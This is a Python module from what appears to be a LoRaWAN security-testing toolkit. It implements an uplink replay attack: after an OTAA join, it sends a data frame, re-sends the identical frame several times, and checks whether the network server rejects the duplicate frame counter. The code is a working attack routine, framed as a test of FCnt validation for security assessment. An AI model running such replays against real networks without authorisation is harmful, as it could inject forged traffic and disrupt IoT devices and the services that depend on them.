"""Replay attack implementation - refactored to new API with typed config."""

from __future__ import annotations

import time
from typing import TYPE_CHECKING, Any

from lora_attack_toolkit.attacks.base import BaseAttack
from lora_attack_toolkit.attacks.result import AttackResult
from lora_attack_toolkit.attacks.analyzer import AttackAnalyzer
from lora_attack_toolkit.attacks.packet_capture import PacketCapture
from lora_attack_toolkit.attacks.validation import validate_criteria
from lora_attack_toolkit.lorawan.join import perform_otaa_join

if TYPE_CHECKING:
    from lora_attack_toolkit.attacks.context import AttackContext
    from lora_attack_toolkit.core.schema_v1 import ExpectedBehavior, ReplayConfigV1


class ReplayAnalyzer(AttackAnalyzer):
    """Analyzer for replay attack results."""
    
    def analyze(
        self, capture: PacketCapture, expected: ExpectedBehavior | None = None
    ) -> dict[str, Any]:
        """Analyze replay attack results."""
        stats = capture.get_stats()
        
        if stats["total_uplinks"] < 2:
            return {
                "success": False,
                "message": "Replay attack did not execute (insufficient uplinks captured)",
                "metrics": {"uplinks_captured": stats["total_uplinks"]},
            }
        
        # Find original and replayed packets
        original = None
        replays = []
        
        for i, packet in enumerate(capture.uplinks):
            if i == 0:
                original = packet
            elif original and packet.phy_payload == original.phy_payload:
                replays.append(packet)
        
        if not replays:
            return {
                "success": False,
                "message": "No replay packets detected",
                "metrics": {
                    "uplinks_captured": stats["total_uplinks"],
                    "original_fcnt": original.fcnt if original else None,
                },
            }
        
        # Build metrics
        metrics = {
            "original_fcnt": original.fcnt if original else None,
            "replays_count": len(replays),
            "replays_sent": len(replays),
            "total_uplinks": stats["total_uplinks"],
            "total_downlinks": stats["total_downlinks"],
        }
        
        # Base result
        result = {
            "success": True,
            "message": f"Replay attack executed: {len(replays)} replay(s) sent",
            "metrics": metrics,
        }
        
        # Add validation results if expected behavior provided
        if expected:
            validation = validate_criteria(
                attack_type="uplink_replay",
                criteria=expected.security_criteria,
                metrics=metrics,
                capture_stats=stats,
                secure_behavior=expected.secure_behavior,
            )
            
            result.update(validation.to_dict())
            result["validation_summary"] = validation.get_summary()
        
        return result


class UplinkReplayAttack(BaseAttack):
    """
    Replay attack implementation using new simplified API with typed config.
    
    Performs OTAA join, sends original uplink, then replays it
    to test Network Server FCnt validation.
    """
    
    name = "uplink_replay"
    
    def run(self, ctx: AttackContext) -> AttackResult:
        """
        Execute uplink replay attack.
        
        Args:
            ctx: Attack context with all services and typed configuration
        
        Returns:
            AttackResult with execution outcome
        """
        ctx.logger.info(f"Starting {self.name} attack")
        
        try:
            # Get typed configuration
            config: ReplayConfigV1 = ctx.config
            
            # Extract parameters from typed config
            replay_count = config.replay_phase.count
            replay_delay = config.replay_phase.delay_sec
            perform_join = config.capture_phase.perform_join
            payload_hex = config.capture_phase.payload_hex or "CAFEBABE"
            
            # Start gateway
            ctx.logger.info("Starting gateway...")
            ctx.gateway.start()
            time.sleep(0.5)
            
            # Perform OTAA join if requested
            if perform_join:
                ctx.logger.info("Performing OTAA join...")
                join_success = perform_otaa_join(
                    device=ctx.device,
                    gateway=ctx.gateway,
                    radio=ctx.radio,
                    timeout_sec=5.0,
                    logger=ctx.logger,
                )
                
                if not join_success:
                    return AttackResult(
                        attack_name=self.name,
                        attack_type="uplink_replay",
                        success=False,
                        message="OTAA join failed - cannot proceed with replay",
                        metrics={},
                    )
                
                ctx.logger.info("OTAA join successful")
            
            # Send original uplink
            ctx.logger.info("Sending original uplink...")
            payload = bytes.fromhex(payload_hex)
            
            original_uplink = ctx.device.build_data_uplink(
                payload=payload,
                f_port=10,
                confirmed=False
            )
            ctx.gateway.forward_uplink(original_uplink, ctx.radio)
            
            # Capture the original packet
            ctx.capture.capture_uplink(
                phy_payload=original_uplink,
                fcnt=ctx.device.runtime.fcnt_up - 1,  # Just sent
                packet_type="data_up",
            )
            
            ctx.logger.info(f"Original uplink sent (FCnt={ctx.device.runtime.fcnt_up - 1})")
            
            # Wait before replay
            time.sleep(replay_delay)
            
            # Replay the uplink
            ctx.logger.info(f"Replaying uplink {replay_count} time(s)...")
            for i in range(replay_count):
                ctx.logger.debug(f"Replay {i+1}/{replay_count}")
                ctx.gateway.forward_uplink(original_uplink, ctx.radio)
                
                # Capture replay
                ctx.capture.capture_uplink(
                    phy_payload=original_uplink,
                    fcnt=ctx.device.runtime.fcnt_up - 1,  # Same FCnt (replay)
                    packet_type="data_up",
                )
                
                if i < replay_count - 1:
                    time.sleep(0.1)
            
            ctx.logger.info(f"Replay attack complete: {replay_count} replay(s) sent")
            
            # Stop gateway
            ctx.gateway.stop()
            
            # Analyze results
            ctx.logger.info("Analyzing results...")
            analyzer = ReplayAnalyzer()
            analysis = analyzer.analyze(ctx.capture, ctx.expected)
            
            return AttackResult(
                attack_name=self.name,
                attack_type="uplink_replay",
                success=analysis["success"],
                message=analysis["message"],
                metrics=analysis["metrics"],
                captured_packets=len(ctx.capture.uplinks) + len(ctx.capture.downlinks),
                validation_summary=analysis.get("validation_summary"),
                criteria_met=analysis.get("criteria_met"),
            )
            
        except Exception as e:
            ctx.logger.error(f"Attack failed: {e}", exc_info=True)
            return AttackResult(
                attack_name=self.name,
                attack_type="uplink_replay",
                success=False,
                message=f"Attack execution failed: {str(e)}",
                metrics={},
                error=str(e),
            )


# Backwards-compatible alias for older tests and examples.
ReplayAttack = UplinkReplayAttack
